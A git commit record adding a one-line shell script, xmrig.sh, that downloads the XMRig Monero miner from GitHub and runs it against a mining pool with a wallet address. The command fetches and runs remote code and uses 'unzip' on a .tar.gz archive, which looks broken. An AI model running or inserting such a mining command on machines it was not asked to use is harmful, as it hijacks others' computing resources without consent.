22b08e8af6c76bd1695068b6aaa1728597577773
karina1121111 <karinsonia631@gmail.com>
2024-10-23 01:10:04 -0700

    Create xmrig.sh

---
+++ xmrig.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.22.1/xmrig-6.22.1-linux-static-x64.tar.gz && unzip xmrig-6.22.1-linux-static-x64.tar.gz && cd xmrig-6.22.1 && ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:8ACTBNn13B6UumHspA2QfweEcSqKvWn1o5f7HP8xecjvZQ7Le9LKhbFV8gxUNCwzTRCTLNTdfi5Tq8WpZmfnxZUJBoqRUxx.unmineable_worker_tcaausuw -p x 
